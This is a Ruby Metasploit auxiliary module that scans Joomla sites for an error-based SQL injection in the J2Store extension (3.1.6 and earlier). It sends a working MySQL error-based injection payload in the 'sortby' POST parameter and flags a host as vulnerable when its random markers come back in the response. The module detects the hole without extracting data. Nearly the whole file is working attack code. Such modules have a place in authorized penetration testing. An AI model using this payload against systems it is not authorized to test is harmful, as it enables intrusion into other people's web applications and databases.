##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'J2Store for Joomla! Error-based SQL injection scanner',
      'Description' => %q{
      This module scans for vulnerable J2store Joomla instances.

This module will exploit an error-based SQL injection
      in order to determine if a given instance of Joomla is vulnerable to a
      SQL injection vulnerability present in version 3.1.6 of J2Store and earlier.

      Categories: Joomla, SQL Injection

      Price: 0

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
},
      'Author'       => ['bperry'],
      'License'     => 'VolatileMinds'
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true,  "The path to the Joomla installation", '/']),
      ], self.class)
  end

  def run_host(target_host)
    front_marker = Rex::Text.rand_text_alpha(5)
    back_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(8)

    payload = "(SELECT 1529 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT (ELT(1529=1529,0x#{flag.unpack("H*")[0]}))),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path,'index.php'),
      'method' => 'POST',
      'vars_post' => {
        'search' => '',
        'sortby' => payload,
        'option' => 'com_j2store',
        'view' => 'products',
        'task' => 'browse',
        'Itemid' => 115
      }
    })

    unless res && res.body
      vprint_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.body =~ /#{front_marker}#{flag}#{back_marker}/
      print_good("#{peer} - Vulnerable to J2Store 3.1.6 (sortby parameter SQL injection)")
      report_vuln({
        :host => rhost,
        :port => rport,
        :proto => 'tcp',
        :name => "J2Store sortby SQL injection",
        :refs => self.references.select { |ref| ref.ctx_val == ""}
      })
    end
  end
end
